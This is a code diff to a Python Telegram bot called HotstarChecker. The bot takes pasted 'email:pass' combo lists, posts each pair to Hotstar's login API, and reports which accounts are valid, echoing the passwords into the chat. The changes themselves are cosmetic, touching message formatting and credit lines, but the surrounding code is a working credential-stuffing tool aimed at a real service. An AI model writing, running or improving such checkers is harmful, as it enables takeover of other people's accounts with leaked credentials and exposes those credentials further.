@@ -41,7 +41,7 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
 async def checker(bot: HotstarChecker, message: Message):
     if message.text.startswith("/") or message.text.startswith("!"):
         return
-    omk = await message.reply(f"<b>{message.text}</b>\n\n<i>Checking.....</i>")    
+    omk = await message.reply(f"<i>Checking.....</i>")    
     try:
         fun = "."
         for l in range(5): # hehe fun, to look cool
@@ -52,9 +52,9 @@ async def checker(bot: HotstarChecker, message: Message):
             combo_list = list(
                 {combo.strip() for combo in message.text.split("\n") if combo.strip()}
             )
+            final = "Accounts checked result:\n"            
             for account in combo_list:
                 try:
-                    final = "Accounts checked result:\n"
                     email, password = account.split(":")
                     url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
                     payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
@@ -76,7 +76,7 @@ async def checker(bot: HotstarChecker, message: Message):
                 except:
                     final += f"\n- **{account}**: Invalid Format ❌"
                     
-            final  += f"\n\n**Checked by {message.from_user.mention}**\nWith <3 By @GodDrick"        
+            final  += f"\n\n**Checked by {message.from_user.mention}**\n__With ❤️ By @GodDrick__"        
             await omk.edit(final)
             return
         
@@ -97,11 +97,11 @@ async def checker(bot: HotstarChecker, message: Message):
         r = requests.post(url, data=json.dumps(payload), headers=headers)
         if (r.status_code==200):
             await omk.edit(
-                f"<u><b>The Hotstar Account is Valid✅</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
+                f"<u><b>The Hotstar Account is Valid✅</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`<b>Checked By: {message.from_user.mention}</b>\n__With love by @GodDrick ❤️__",
             )
         else:
             await omk.edit(
-                f"<u><b>The Hotstar Account is Invalid❌</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`\n\n<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
+                f"<u><b>The Hotstar Account is Invalid❌</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`\n\n<b>Checked By: {message.from_user.mention}</b>\n__With love by @GodDrick ❤️__",
             )
     except:
         await omk.edit("Something Went Wrong! Make sure you have put account in correct order, i.e, email:pass... retry again!")
